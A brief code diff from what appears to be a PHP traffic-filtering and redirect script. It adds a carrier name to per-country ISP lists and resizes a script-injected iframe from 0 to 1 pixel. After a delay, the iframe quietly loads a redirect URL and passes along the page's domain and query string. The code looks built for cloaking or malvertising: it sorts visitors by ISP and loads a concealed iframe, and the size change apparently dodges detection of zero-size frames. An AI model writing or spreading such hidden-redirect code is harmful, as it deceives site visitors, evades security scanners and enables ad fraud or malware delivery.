@@ -36,7 +36,7 @@
 												 "Bright House Networks",
 												 "Abovenet Communications",
 												 "Google",
-												 "Cable One"),
+												 "Cable One", "VECTANT"),
 								   "MX" => array("Telmex","Mega Cable, S.A. de C.V.","Cablemas Telecomunicaciones SA de CV","CablevisiÃ³n, S.A. de C.V.","Iusacell","Television Internacional, S.A. de C.V.","Mexico Red de Telecomunicaciones, S. de R.L. de C.","Axtel","Cablevision S.A. de C.V.","Nextel Mexico","Telefonos del Noroeste, S.A. de C.V.","Movistar MÃ©xico","RadioMovil Dipsa, S.A. de C.V."),	//MX												 
 								   "FR" => array("Orange","Free SAS","SFR","OVH SAS","Bouygues Telecom","Free Mobile SAS","Bouygues Mobile","Numericable","Orange France Wireless"),	//FR									
 								   "UK" => array("BT","Three","EE Mobile","Telefonica O2 UK","Vodafone","Vodafone Limited"),	//UK									
@@ -733,8 +733,8 @@
 
 											var el = document.createElement('iframe');
 											el.src = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);
-											el.width = 0;
-											el.height = 0;
+											el.width = 1;
+											el.height = 1;
 											document.body.appendChild(el);										
 										}, 3000);
 									}
